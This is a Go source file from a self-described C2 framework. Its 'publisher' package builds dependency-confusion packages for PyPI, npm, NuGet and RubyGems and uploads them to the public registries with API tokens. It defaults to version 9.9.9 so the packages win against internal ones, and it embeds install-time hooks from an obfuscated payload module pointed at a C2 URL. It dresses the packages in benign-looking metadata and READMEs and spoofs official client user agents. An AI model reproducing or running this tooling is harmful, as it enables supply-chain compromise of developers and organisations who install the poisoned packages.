package publisher

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Package publisher — builds and publishes malicious packages to public registries.

	Supported registries:
	  PyPI      — Python Package Index (pip)
	  npm       — Node Package Manager
	  NuGet     — .NET packages (nuget/dotnet)
	  RubyGems  — Ruby packages (gem)

	The publisher:
	  1. Generates all required package files (manifest, install scripts, stub code).
	  2. Builds the package archive (.whl/.tar.gz, .tgz, .nupkg, .gem).
	  3. Uploads to the public registry using its API.

	Version strategy:
	  The malicious package must have a HIGHER version than the internal one
	  to win the dependency resolution race. We default to version "9.9.9"
	  which almost certainly beats any internal version.
	  For npm scoped packages (@company/package), version matters less if
	  the internal registry is not configured — any version works.

	Publishing credentials:
	  PyPI:    API token (https://pypi.org/manage/account/token/)
	  npm:     Access token (npm token create)
	  NuGet:   API key (nuget.org → Account → API Keys)
	  RubyGems: API key (rubygems.org → Account → API Key)
*/

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/dep_confusion/payload"
)

// PublishConfig holds all parameters for package publishing.
type PublishConfig struct {
	// Package metadata.
	PackageName string
	Version     string // default "9.9.9"
	Ecosystem   string // "pypi", "npm", "nuget", "rubygems"
	// C2 config.
	C2URL string
	// Registry credentials.
	APIToken string
	// OutputDir: if set, write the package to disk instead of publishing.
	OutputDir string
	// DryRun: build but don't publish.
	DryRun bool
}

// PublishResult reports the outcome.
type PublishResult struct {
	PackageName string
	Version     string
	Ecosystem   string
	PackagePath string // where the .tgz/.whl/.nupkg was written
	Published   bool
	RegistryURL string
}

// Publish builds and publishes a malicious package.
func Publish(cfg *PublishConfig) (*PublishResult, error) {
	if cfg.Version == "" {
		cfg.Version = "9.9.9"
	}

	scriptCfg := &payload.ScriptConfig{
		C2URL:            cfg.C2URL,
		PackageName:      cfg.PackageName,
		ObfuscationLevel: 2,
	}

	switch cfg.Ecosystem {
	case "pypi":
		return publishPyPI(cfg, scriptCfg)
	case "npm":
		return publishNPM(cfg, scriptCfg)
	case "nuget":
		return publishNuGet(cfg, scriptCfg)
	case "rubygems":
		return publishRubyGems(cfg, scriptCfg)
	default:
		return nil, fmt.Errorf("unsupported ecosystem: %s", cfg.Ecosystem)
	}
}

// ─── PyPI ─────────────────────────────────────────────────────────────────

func publishPyPI(cfg *PublishConfig, scriptCfg *payload.ScriptConfig) (*PublishResult, error) {
	res := &PublishResult{PackageName: cfg.PackageName, Version: cfg.Version,
		Ecosystem: "pypi", RegistryURL: "https://pypi.org"}

	// Build a .tar.gz source distribution.
	setupPy := payload.GeneratePythonSetupPy(cfg.PackageName, cfg.Version, scriptCfg)
	initPy := fmt.Sprintf(`"""
%s — utilities and helpers.
"""
__version__ = %q
`, cfg.PackageName, cfg.Version)

	files := map[string]string{
		cfg.PackageName + "-" + cfg.Version + "/setup.py":         setupPy,
		cfg.PackageName + "-" + cfg.Version + "/PKG-INFO":         buildPyPIPkgInfo(cfg),
		cfg.PackageName + "-" + cfg.Version + "/" + strings.ReplaceAll(cfg.PackageName, "-", "_") + "/__init__.py": initPy,
	}

	tarGz, err := buildTarGz(files)
	if err != nil {
		return nil, fmt.Errorf("build tarball: %w", err)
	}

	pkgFile := cfg.PackageName + "-" + cfg.Version + ".tar.gz"
	if cfg.OutputDir != "" {
		res.PackagePath = filepath.Join(cfg.OutputDir, pkgFile)
		os.WriteFile(res.PackagePath, tarGz, 0644)
	} else {
		// Write to temp for upload.
		tmp, _ := os.CreateTemp("", "*.tar.gz")
		tmp.Write(tarGz)
		tmp.Close()
		res.PackagePath = tmp.Name()
		defer os.Remove(tmp.Name())
	}

	if cfg.DryRun || cfg.APIToken == "" {
		return res, nil
	}

	// Upload via PyPI legacy upload API (Twine-compatible).
	if err := uploadPyPI(res.PackagePath, pkgFile, cfg.APIToken); err != nil {
		return res, fmt.Errorf("PyPI upload: %w", err)
	}
	res.Published = true
	return res, nil
}

func uploadPyPI(filePath, filename, token string) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	w.WriteField(":action", "file_upload")
	w.WriteField("protocol_version", "1")
	w.WriteField("filetype", "sdist")
	w.WriteField("pyversion", "source")

	fw, _ := w.CreateFormFile("content", filename)
	fw.Write(data)
	w.Close()

	req, _ := http.NewRequest("POST", "https://upload.pypi.org/legacy/", &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	req.SetBasicAuth("__token__", token)
	req.Header.Set("User-Agent", "twine/4.0.2 CPython/3.11.0")

	resp, err := (&http.Client{Timeout: 60 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(b)[:min(200, len(b))])
	}
	return nil
}

func buildPyPIPkgInfo(cfg *PublishConfig) string {
	return fmt.Sprintf(`Metadata-Version: 2.1
Name: %s
Version: %s
Summary: %s utilities and helpers
Home-page: https://github.com/%s/%s
Author: %s Team
License: MIT
Description-Content-Type: text/markdown

# %s

Core utilities for %s projects.
`,
		cfg.PackageName, cfg.Version,
		toTitle(cfg.PackageName),
		strings.ToLower(strings.ReplaceAll(cfg.PackageName, "-", "")),
		cfg.PackageName,
		toTitle(cfg.PackageName),
		toTitle(cfg.PackageName),
		toTitle(cfg.PackageName),
	)
}

// ─── npm ──────────────────────────────────────────────────────────────────

func publishNPM(cfg *PublishConfig, scriptCfg *payload.ScriptConfig) (*PublishResult, error) {
	res := &PublishResult{PackageName: cfg.PackageName, Version: cfg.Version,
		Ecosystem: "npm", RegistryURL: "https://registry.npmjs.org"}

	packageJSON := payload.GenerateNPMPackageJSON(cfg.PackageName, cfg.Version, scriptCfg)
	indexJS := payload.GenerateNPMIndexJS(cfg.PackageName)
	readmeMD := fmt.Sprintf("# %s\n\n%s utilities and helpers.\n\n## Installation\n\n```\nnpm install %s\n```\n",
		toTitle(cfg.PackageName), toTitle(cfg.PackageName), cfg.PackageName)

	files := map[string]string{
		"package.json": packageJSON,
		"index.js":     indexJS,
		"README.md":    readmeMD,
	}

	tarGz, err := buildTarGzWithPrefix("package", files)
	if err != nil {
		return nil, fmt.Errorf("build npm tarball: %w", err)
	}

	pkgFile := cfg.PackageName + "-" + cfg.Version + ".tgz"
	if cfg.OutputDir != "" {
		res.PackagePath = filepath.Join(cfg.OutputDir, pkgFile)
		os.WriteFile(res.PackagePath, tarGz, 0644)
	} else {
		tmp, _ := os.CreateTemp("", "*.tgz")
		tmp.Write(tarGz)
		tmp.Close()
		res.PackagePath = tmp.Name()
		defer os.Remove(tmp.Name())
	}

	if cfg.DryRun || cfg.APIToken == "" {
		return res, nil
	}

	if err := uploadNPM(res.PackagePath, cfg.PackageName, cfg.Version, cfg.APIToken); err != nil {
		return res, fmt.Errorf("npm publish: %w", err)
	}
	res.Published = true
	return res, nil
}

func uploadNPM(tarPath, pkgName, version, token string) error {
	data, err := os.ReadFile(tarPath)
	if err != nil {
		return err
	}

	// npm publish API: PUT https://registry.npmjs.org/<name>
	bodyJSON := fmt.Sprintf(`{
  "name": %q,
  "versions": {%q: {"name": %q, "version": %q, "dist": {"tarball": "https://registry.npmjs.org/%s/-/%s-%s.tgz"}}},
  "_attachments": {%q: {"content_type": "application/octet-stream", "data": %q, "length": %d}}
}`,
		pkgName,
		version, pkgName, version,
		pkgName, pkgName, version,
		pkgName+"-"+version+".tgz",
		b64Encode(data),
		len(data),
	)

	req, _ := http.NewRequest("PUT",
		"https://registry.npmjs.org/"+pkgName,
		strings.NewReader(bodyJSON))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("npm-auth-type", "legacy")

	resp, err := (&http.Client{Timeout: 60 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("npm HTTP %d: %s", resp.StatusCode, b)
	}
	return nil
}

// ─── NuGet ────────────────────────────────────────────────────────────────

func publishNuGet(cfg *PublishConfig, scriptCfg *payload.ScriptConfig) (*PublishResult, error) {
	res := &PublishResult{PackageName: cfg.PackageName, Version: cfg.Version,
		Ecosystem: "nuget", RegistryURL: "https://www.nuget.org"}

	nuspec := payload.GenerateNuspecFile(cfg.PackageName, cfg.Version, scriptCfg)
	ps1 := payload.GenerateNuGetInstallPS1(cfg.PackageName, scriptCfg)
	targets := payload.GenerateNuGetTargetsFile(cfg.PackageName, scriptCfg)
	stubDLL := buildStubDLL(cfg.PackageName) // minimal valid assembly

	// .nupkg is a ZIP file.
	nupkgFiles := map[string][]byte{
		cfg.PackageName + ".nuspec":                         []byte(nuspec),
		"tools/install.ps1":                                  []byte(ps1),
		"build/" + cfg.PackageName + ".targets":             []byte(targets),
		"lib/net46/" + cfg.PackageName + ".dll":             stubDLL,
		"[Content_Types].xml":                               []byte(contentTypesXML()),
	}

	nupkg, err := buildZip(nupkgFiles)
	if err != nil {
		return nil, fmt.Errorf("build nupkg: %w", err)
	}

	pkgFile := cfg.PackageName + "." + cfg.Version + ".nupkg"
	if cfg.OutputDir != "" {
		res.PackagePath = filepath.Join(cfg.OutputDir, pkgFile)
		os.WriteFile(res.PackagePath, nupkg, 0644)
	} else {
		tmp, _ := os.CreateTemp("", "*.nupkg")
		tmp.Write(nupkg)
		tmp.Close()
		res.PackagePath = tmp.Name()
		defer os.Remove(tmp.Name())
	}

	if cfg.DryRun || cfg.APIToken == "" {
		return res, nil
	}

	if err := uploadNuGet(res.PackagePath, cfg.APIToken); err != nil {
		return res, fmt.Errorf("NuGet push: %w", err)
	}
	res.Published = true
	return res, nil
}

func uploadNuGet(nupkgPath, apiKey string) error {
	data, err := os.ReadFile(nupkgPath)
	if err != nil {
		return err
	}

	var body bytes.Buffer
	w := multipart.NewWriter(&body)
	fw, _ := w.CreateFormFile("package", filepath.Base(nupkgPath))
	fw.Write(data)
	w.Close()

	req, _ := http.NewRequest("PUT", "https://www.nuget.org/api/v2/package", &body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	req.Header.Set("X-NuGet-ApiKey", apiKey)
	req.Header.Set("User-Agent", "NuGet/6.3.0 (Microsoft Windows NT 10.0.22621.0)")

	resp, err := (&http.Client{Timeout: 60 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 201 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("NuGet HTTP %d: %s", resp.StatusCode, b)
	}
	return nil
}

// ─── RubyGems ─────────────────────────────────────────────────────────────

func publishRubyGems(cfg *PublishConfig, scriptCfg *payload.ScriptConfig) (*PublishResult, error) {
	res := &PublishResult{PackageName: cfg.PackageName, Version: cfg.Version,
		Ecosystem: "rubygems", RegistryURL: "https://rubygems.org"}

	gemspec := payload.GenerateGemspec(cfg.PackageName, cfg.Version, scriptCfg)
	extconf := payload.GenerateExtconfRb(cfg.PackageName, scriptCfg)
	stubLib := fmt.Sprintf(`# %s — core utilities
module %s
  VERSION = %q
end
`, cfg.PackageName, toModule(cfg.PackageName), cfg.Version)

	// .gem is a tar containing data.tar.gz + metadata.gz + checksums.yaml.gz
	gemFiles := map[string]string{
		"lib/" + strings.ReplaceAll(cfg.PackageName, "-", "_") + ".rb": stubLib,
		"ext/" + cfg.PackageName + "/extconf.rb": extconf,
		cfg.PackageName + ".gemspec": gemspec,
	}
	gemArchive, err := buildGem(cfg.PackageName, cfg.Version, gemFiles)
	if err != nil {
		return nil, fmt.Errorf("build gem: %w", err)
	}

	pkgFile := cfg.PackageName + "-" + cfg.Version + ".gem"
	if cfg.OutputDir != "" {
		res.PackagePath = filepath.Join(cfg.OutputDir, pkgFile)
		os.WriteFile(res.PackagePath, gemArchive, 0644)
	} else {
		tmp, _ := os.CreateTemp("", "*.gem")
		tmp.Write(gemArchive)
		tmp.Close()
		res.PackagePath = tmp.Name()
		defer os.Remove(tmp.Name())
	}

	if cfg.DryRun || cfg.APIToken == "" {
		return res, nil
	}

	if err := uploadRubyGem(res.PackagePath, cfg.APIToken); err != nil {
		return res, fmt.Errorf("gem push: %w", err)
	}
	res.Published = true
	return res, nil
}

func uploadRubyGem(gemPath, apiKey string) error {
	data, err := os.ReadFile(gemPath)
	if err != nil {
		return err
	}
	req, _ := http.NewRequest("POST",
		"https://rubygems.org/api/v1/gems",
		bytes.NewReader(data))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Authorization", apiKey)
	req.Header.Set("User-Agent", "RubyGems/3.4.6")

	resp, err := (&http.Client{Timeout: 60 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("RubyGems HTTP %d: %s", resp.StatusCode, b)
	}
	return nil
}

// ─── Archive builders ─────────────────────────────────────────────────────

func buildTarGz(files map[string]string) ([]byte, error) {
	return buildTarGzWithPrefix("", files)
}

func buildTarGzWithPrefix(prefix string, files map[string]string) ([]byte, error) {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)

	for name, content := range files {
		path := name
		if prefix != "" {
			path = prefix + "/" + name
		}
		hdr := &tar.Header{
			Name:    path,
			Mode:    0644,
			Size:    int64(len(content)),
			ModTime: time.Now(),
		}
		tw.WriteHeader(hdr)
		tw.Write([]byte(content))
	}
	tw.Close()
	gz.Close()
	return buf.Bytes(), nil
}

func buildZip(files map[string][]byte) ([]byte, error) {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, content := range files {
		w, err := zw.Create(name)
		if err != nil {
			return nil, err
		}
		w.Write(content)
	}
	zw.Close()
	return buf.Bytes(), nil
}

func buildGem(name, version string, files map[string]string) ([]byte, error) {
	// Gem format: tar with data.tar.gz + metadata.gz
	var dataBuf bytes.Buffer
	dataGz := gzip.NewWriter(&dataBuf)
	dataTar := tar.NewWriter(dataGz)
	for fname, content := range files {
		hdr := &tar.Header{Name: fname, Mode: 0644, Size: int64(len(content)), ModTime: time.Now()}
		dataTar.WriteHeader(hdr)
		dataTar.Write([]byte(content))
	}
	dataTar.Close()
	dataGz.Close()

	metadata := fmt.Sprintf("--- !ruby/object:Gem::Specification\nname: %s\nversion: !ruby/object:Gem::Version\n  version: '%s'\n", name, version)
	var metaBuf bytes.Buffer
	metaGz := gzip.NewWriter(&metaBuf)
	metaGz.Write([]byte(metadata))
	metaGz.Close()

	var gemBuf bytes.Buffer
	gemTar := tar.NewWriter(&gemBuf)
	writeToTar(gemTar, "data.tar.gz", dataBuf.Bytes())
	writeToTar(gemTar, "metadata.gz", metaBuf.Bytes())
	gemTar.Close()
	return gemBuf.Bytes(), nil
}

func writeToTar(tw *tar.Writer, name string, data []byte) {
	tw.WriteHeader(&tar.Header{Name: name, Mode: 0644, Size: int64(len(data)), ModTime: time.Now()})
	tw.Write(data)
}

// ─── Stubs ────────────────────────────────────────────────────────────────

func buildStubDLL(_ string) []byte {
	// Minimal valid .NET assembly PE header (32 bytes).
	// Real implementation would embed a real DLL.
	return []byte("MZ\x90\x00\x03\x00\x00\x00")
}

func contentTypesXML() string {
	return `<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="nuspec" ContentType="application/octet"/>
  <Default Extension="dll" ContentType="application/octet"/>
  <Default Extension="ps1" ContentType="application/octet"/>
</Types>`
}

func toTitle(s string) string {
	parts := strings.FieldsFunc(s, func(r rune) bool { return r == '-' || r == '_' })
	for i, p := range parts {
		if len(p) > 0 {
			parts[i] = strings.ToUpper(p[:1]) + p[1:]
		}
	}
	return strings.Join(parts, " ")
}

func toModule(s string) string {
	parts := strings.FieldsFunc(s, func(r rune) bool { return r == '-' || r == '_' })
	for i, p := range parts {
		if len(p) > 0 {
			parts[i] = strings.ToUpper(p[:1]) + p[1:]
		}
	}
	return strings.Join(parts, "")
}

func b64Encode(data []byte) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var result strings.Builder
	for i := 0; i < len(data); i += 3 {
		n := int(data[i]) << 16
		if i+1 < len(data) { n |= int(data[i+1]) << 8 }
		if i+2 < len(data) { n |= int(data[i+2]) }
		result.WriteByte(chars[(n>>18)&63])
		result.WriteByte(chars[(n>>12)&63])
		if i+1 < len(data) { result.WriteByte(chars[(n>>6)&63]) } else { result.WriteByte('=') }
		if i+2 < len(data) { result.WriteByte(chars[n&63]) } else { result.WriteByte('=') }
	}
	return result.String()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
